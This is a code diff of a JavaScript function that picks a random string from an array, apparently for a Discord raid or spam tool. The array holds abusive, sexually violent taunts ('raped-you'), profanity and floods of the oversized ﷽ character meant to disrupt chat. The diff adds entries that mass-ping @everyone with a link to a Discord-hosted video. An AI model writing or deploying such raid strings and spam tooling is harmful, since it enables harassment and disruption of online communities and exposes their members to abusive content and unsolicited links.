@@ -207,7 +207,7 @@ function randomT() {
 
 
 function random123() {
-  var rand = ['nightmare-troupe-raped-you-huehuehuehuehuehue', '【ℕ𝕋】-raped-you-﷽﷽﷽﷽﷽﷽﷽﷽﷽', 'eat-shit-get-fucked-﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽', 'assy-raped-you-﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽', '【ℕ𝕋】-raped-you-git-gud', '﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽'];
+  var rand = ['https://cdn.discordapp.com/attachments/ 763108453874663444/771037666053324840/video0.mp4 @everyone', '@everyone https://cdn.discordapp.com/attachments/ 763108453874663444/771037666053324840/video0.mp4', 'nightmare-troupe-raped-you-huehuehuehuehuehue', '【ℕ𝕋】-raped-you-﷽﷽﷽﷽﷽﷽﷽﷽﷽', 'eat-shit-get-fucked-﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽', 'assy-raped-you-﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽', '【ℕ𝕋】-raped-you-git-gud', '﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽'];
 
   return rand[Math.floor(Math.random()*rand.length)];
 }
